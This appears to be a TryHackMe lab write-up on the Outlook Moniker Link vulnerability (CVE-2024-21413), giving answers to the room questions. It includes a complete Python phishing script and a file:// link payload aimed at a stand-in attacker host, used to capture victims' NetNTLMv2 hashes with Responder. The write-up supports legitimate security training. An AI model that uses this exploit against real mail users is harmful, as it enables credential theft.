---
title: Moniker Link (CVE-2024-21413)
date: 2025-10-29
draft: false
tags:
  - Cybersecurity
  - TryHackMe
  - Exploits
  - CVE
---
**Note:** 

- The questions are shortened for a cleaner view
- Questions that are straightforward will only have answers attached. Such questions can be easily answered by reading the documentation given in the room.

## Task  1 - Introduction

#### 1) What "Severity" rating has the CVE been assigned?

**Ans:** `Critical`

---

## Task  2 -  Moniker Link (CVE-2024-21413)

#### 1) What Moniker Link type do we use in the hyperlink?

**Ans:** `file://`

#### 2) Special character used to bypass "Protected View"?

**Ans:** `!`

>The vulnerability here exists by modifying our hyperlink to include the `!` special character and some text in our Moniker Link which results in bypassing Outlook’s Protected View. For example: `<a href="file://ATTACKER_IP/test!exploit">Click me</a>`.

---

## Task  3 - Exploitation

#### 1) Application used to capture the user's hash?

**Ans:** `responder`

#### 2) What type of hash is captured ? 

**Ans:** `netNTLMv2`

*Make sure you don't forget to add the Attack Box's IP address you attack machine's IP address as well the Windows Machine IP address in the script*

```python
'''
Author: CMNatic | https://github.com/cmnatic
Version: 1.0 | 19/02/2024
'''

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formataddr

sender_email = 'attacker@monikerlink.thm' # Replace with your sender email address
receiver_email = 'victim@monikerlink.thm' # Replace with the recipient email address
password = input("Enter your attacker email password: ")
html_content = """\
<!DOCTYPE html>
<html lang="en">
    <p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>

    </body>
</html>"""

message = MIMEMultipart()
message['Subject'] = "CVE-2024-21413"
message["From"] = formataddr(('CMNatic', sender_email))
message["To"] = receiver_email

# Convert the HTML string into bytes and attach it to the message object
msgHtml = MIMEText(html_content,'html')
message.attach(msgHtml)

server = smtplib.SMTP('MAILSERVER', 25)
server.ehlo()
try:
    server.login(sender_email, password)
except Exception as err:
    print(err)
    exit(-1)

try:
    server.sendmail(sender_email, [receiver_email], message.as_string())
    print("\n Email delivered")
except Exception as error:
    print(error)
finally:
    server.quit()
```

````python
<p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>
````

```python
server = smtplib.SMTP('MAILSERVER', 25)
```

- *Further tasks do not require any answers*

---
